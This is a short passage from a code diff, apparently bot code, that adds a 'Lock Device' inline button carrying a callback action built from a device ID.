+          btn('Lock Device', { callback_data: `act:lock:${deviceId}`, style: 'danger', icon: CUSTOM_EMOJI.lock })
         ]]
       }
     }
